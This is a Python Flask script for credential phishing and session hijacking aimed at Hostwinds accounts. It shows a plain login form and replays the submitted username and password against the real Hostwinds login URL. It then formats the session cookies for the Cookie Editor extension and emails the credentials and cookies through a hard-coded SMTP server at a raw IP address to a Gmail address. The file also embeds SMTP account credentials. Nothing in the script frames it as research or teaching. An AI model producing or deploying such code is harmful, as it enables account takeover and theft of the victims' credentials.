import requests
from flask import Flask, request, render_template_string
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import json

# Flask setup
app = Flask(__name__)

# SMTP server details
SMTP_SERVER = '146.19.254.243'  # Replace with your SMTP server
SMTP_PORT = 6040  # Non-SSL port
SMTP_USER = 'auto528@cryptasphere.bio'  # Your email
SMTP_USERR = 'auto528'
SMTP_PASSWORD = 'vip7a81be0e2b36'  # Your email password
TO_EMAIL = 'danielnewwoj@gmail.com'  # Recipient email

# Hostwinds login URL
LOGIN_URL = 'https://clients.hostwinds.com/dologin.php'  # Replace with the actual login URL

# HTML form for login
HTML_FORM = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login Form</title>
</head>
<body>
    <h2>Login Form</h2>
    <form action="/submit" method="POST">
        <label for="username">Username:</label><br>
        <input type="text" id="username" name="username"><br>
        <label for="password">Password:</label><br>
        <input type="password" id="password" name="password"><br><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>
"""

@app.route('/')
def form():
    return render_template_string(HTML_FORM)

@app.route('/submit', methods=['POST'])
def submit():
    # Get form data
    username = request.form.get('username')
    password = request.form.get('password')

    # Prepare login data
    login_data = {
        'username': username,
        'password': password,
        'login': 'Login'
    }

    # Start a session
    session = requests.Session()

    try:
        # Post the login data to the website
        response = session.post(LOGIN_URL, data=login_data)
        response.raise_for_status()

        # Check if login was successful
        if response.status_code == 200:
            # Fetch cookies from the session
            raw_cookies = session.cookies
        else:
            return "Login failed. Check credentials or website behavior."

    except Exception as e:
        return f"Error during login: {str(e)}"

    # Format cookies for Cookie Editor
    cookies = []
    for cookie in raw_cookies:
        cookie_dict = {
            "name": cookie.name,
            "value": cookie.value,
            "domain": cookie.domain,
            "path": cookie.path,
            "secure": cookie.secure,
            "httpOnly": getattr(cookie, 'rest', {}).get('HttpOnly', False),
            "hostOnly": cookie.domain.startswith('.'),
            "session": not cookie.expires,  # True if no expiration
            "expirationDate": cookie.expires if cookie.expires else None
        }
        cookies.append(cookie_dict)

    # Ensure JSON format for Cookie Editor
    cookie_json = json.dumps(cookies, indent=2)

    # Print to console for debugging
    print("Cookies for Cookie Editor:")
    print(cookie_json)

    # Email cookies
    message = MIMEMultipart()
    message['From'] = SMTP_USER
    message['To'] = TO_EMAIL
    message['Subject'] = 'Login Cookies'

    body = f"""
    Username: {username}
    Password: {password}

    Cookies (Copy into Cookie Editor):
    {cookie_json}
    """
    message.attach(MIMEText(body, 'plain'))

    try:
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.login(SMTP_USERR, SMTP_PASSWORD)
            server.sendmail(SMTP_USER, TO_EMAIL, message.as_string())
        return "Form submitted, and cookies sent via email successfully!"
    except Exception as e:
        return f"Error sending email: {str(e)}"

if __name__ == '__main__':
    app.run(debug=True, port=5000)
